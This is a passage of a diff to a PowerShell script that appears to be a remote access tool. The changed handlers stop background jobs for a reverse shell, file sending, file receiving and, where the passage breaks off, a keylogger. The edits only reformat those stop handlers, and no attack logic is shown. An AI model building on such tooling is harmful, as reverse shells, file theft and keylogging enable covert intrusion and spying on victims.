@@ -531,59 +531,61 @@ while($rState)
 		#### stop methods..
 
 		elseif($cmd -eq "stop job -rs" -or $cmd -eq "stop job -reverseShell") {
+			if ( [bool](get-job -Name "ReverseShellJob" -ea silentlycontinue) )
+			{						
+				stop-Job -Name "ReverseShellJob" | out-string;
+				remove-Job -Name "ReverseShellJob" | out-string;
+				$msg = '[+]ReverseShellJob is terminated..';
+			}
 
-			if ( [bool](get-job -Name "ReverseShellJob" -ea silentlycontinue) )
-			{						
-				stop-Job -Name "ReverseShellJob" | out-string
-				remove-Job -Name "ReverseShellJob" | out-string
-				$msg = '[+]ReverseShellJob is terminated..';
-			}
-			else
-			{
-				$msg = '[+]ReverseShellJob is not running..';
-			}	
-
-			$params=$stream,$msg,$console
+			else
+
+			{
+				$msg = '[+]ReverseShellJob is not running..';
+			}	
+
+			$params=$stream,$msg,$console
 			writeToStream($params);
-
 		}
 
 		elseif($cmd -eq "stop job -sf" -or $cmd -eq "stop job -sendFile") {
 
-			if ( [bool](get-job -Name "SendFileJob" -ea silentlycontinue) )
-			{						
-				stop-Job -Name "SendFileJob" | out-string
-				remove-Job -Name "SendFileJob" | out-string
-				$msg = '[+]SendFileJob is terminated..';
-			}
-			else
-			{
-				$msg = '[+]SendFileJob is not running..';
-			}	
-
-			$params=$stream,$msg,$console
-			writeToStream($params);
+			if ( [bool](get-job -Name "SendFileJob" -ea silentlycontinue) )
 
+			{						
+				stop-Job -Name "SendFileJob" | out-string
+				remove-Job -Name "SendFileJob" | out-string
+				$msg = '[+]SendFileJob is terminated..';
+			}
+
+			else
+
+			{
+				$msg = '[+]SendFileJob is not running..';
+			}	
+
+			$params=$stream,$msg,$console
+			writeToStream($params);
 		}
 
 
 
 		elseif($cmd -eq "stop job -rf" -or $cmd -eq "stop job -receiveFile") {
 
-			if ( [bool](get-job -Name "ReceiveFileJob" -ea silentlycontinue) )
-			{						
-				stop-Job -Name "ReceiveFileJob" | out-string
-				remove-Job -Name "ReceiveFileJob" | out-string
-				$msg = '[+]ReceiveFileJob is terminated..';
-			}
-			else
-			{
-				$msg = '[+]ReceiveFileJob is not running..';
-			}	
-
-			$params=$stream,$msg,$console
-			writeToStream($params);
+			if ( [bool](get-job -Name "ReceiveFileJob" -ea silentlycontinue) )
+			{						
+				stop-Job -Name "ReceiveFileJob" | out-string
+				remove-Job -Name "ReceiveFileJob" | out-string
+				$msg = '[+]ReceiveFileJob is terminated..';
+			}
 
+			else
+			{
+				$msg = '[+]ReceiveFileJob is not running..';
+			}	
+
+			$params=$stream,$msg,$console
+			writeToStream($params);
 		}
 
 		elseif($cmd -eq "stop job -keylogger" -or $cmd -eq "stop job -kl") {
